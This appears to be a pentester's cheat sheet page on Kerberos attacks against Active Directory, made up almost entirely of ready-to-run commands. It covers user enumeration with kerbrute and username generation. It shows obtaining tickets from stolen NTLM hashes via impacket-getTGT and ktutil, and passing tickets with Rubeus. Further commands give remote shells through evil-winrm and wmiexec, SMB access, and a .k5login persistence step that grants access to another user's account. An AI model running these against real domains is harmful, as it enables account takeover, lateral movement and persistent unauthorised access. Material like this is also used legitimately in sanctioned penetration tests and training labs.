---
title: "Kerberos"
date: 2024-7-2
tags: ["kerberos", "kerbrute", "rubeus", "active directory", "ad", "domain controller", "Windows", "smb"]
---

---
### Users enum

{{< tab set1 tab1 active >}}kerbrute{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```bash
kerbrute userenum --domain <DOMAIN> --dc <DC> usernames.txt
```

</div>

<small>*Ref: [kerbrute](https://github.com/ropnop/kerbrute)*</small>

{{< /tabcontent >}}

### Usernames generator

{{< tab set2 tab1 active >}}username-anarchy{{< /tab >}}
{{< tabcontent set2 tab1 >}}

<div>

```bash
./username-anarchy -i users.txt | tee usernames.txt
```

</div>

<small>*Ref: [username-anarchy](https://github.com/urbanadventurer/username-anarchy)*</small>

{{< /tabcontent >}}

<br>

---

### Generate Kerberos ticket (From Linux)

{{< tab set3 tab1 active >}}Impacket{{< /tab >}}
{{< tab set3 tab2 >}}Kinit{{< /tab >}}
{{< tabcontent set3 tab1 >}}

<div>

```bash
sudo ntpdate -s <DC> && impacket-getTGT -hashes :<HASH> <DOMAIN>/administrator
```

```bash
export KRB5CCNAME=administrator.ccache
```

```bash
# Check ticket
klist
```

</div>

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

<div>

```bash
# Step 0: Installation
sudo apt install krb5-user cifs-utils
```

```bash
# Step 1: Add domain controller to '/etc/hosts' (Try different order if not work)
10.10.11.10 <DC> <DOMAIN>
```

```bash
# Step 2: Add domain controller as a DNS server to '/etc/resolv.conf' [optional]
nameserver 10.10.11.10
```

```bash
# Step 3: Edit '/etc/krb5.conf'

[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```

```bash
# Step 4: Sync time to domain controller
sudo ntpdate -s <DC>
```

</div>

#### 2a. Without creds

<div>

```bash
# Generate kerberos ticket for user
kinit <USER>
```

</div>

#### 2b. With NTLM hash

<div>

```bash
ktutil
```

```bash
add_entry -p administrator@<DOMAIN> -k 1 -key -e rc4-hmac
```

```bash
<HASH>
```

```bash
write_kt administrator.keytab
```

```bash
exit
```

```bash
kinit -V -k -t administrator.keytab -f administrator@<DOMAIN>
```

</div>

#### 3. Check ticket

<div>

```bash
klist
```

</div>

{{< /tabcontent >}}

### Generate Kerberos ticket (From Windows)

{{< tab set4 tab1 active >}}rubeus{{< /tab >}}
{{< tabcontent set4 tab1 >}}

<div>

```powershell
.\Rubeus.exe asktgt /user:<USER> /password:<PASSWORD> /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
```

</div>

{{< /tabcontent >}}

<br>

---


### Winrm with Kerberos

{{< tab set5 tab1 active >}}evil-winrm{{< /tab >}}
{{< tab set5 tab2 >}}wmiexec{{< /tab >}}
{{< tabcontent set5 tab1 >}}

<div>

```bash
# Step 1: Edit '/etc/krb5.conf'

[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```


```bash
# Step 2: Connect
sudo ntpdate -s <DC> && evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
```

</div>

{{< /tabcontent >}}
{{< tabcontent set5 tab2 >}}

<div>

```bash
sudo ntpdate -s <DC> && impacket-wmiexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
```

</div>

{{< /tabcontent >}}

<br>

---

### Connect to SMB with Kerberos

<div>

```bash
sudo ntpdate -s <DC> && impacket-smbclient <DOMAIN>/<USER>@<TARGET_DOMAIN> -k -no-pass
```

</div>

<br>

---

### Add Kerberos Access in Linux

<div>

```bash
echo "<USER>@<DOMAIN>" > /home/<TARGET_USER>/.k5login
```

</div>

<br>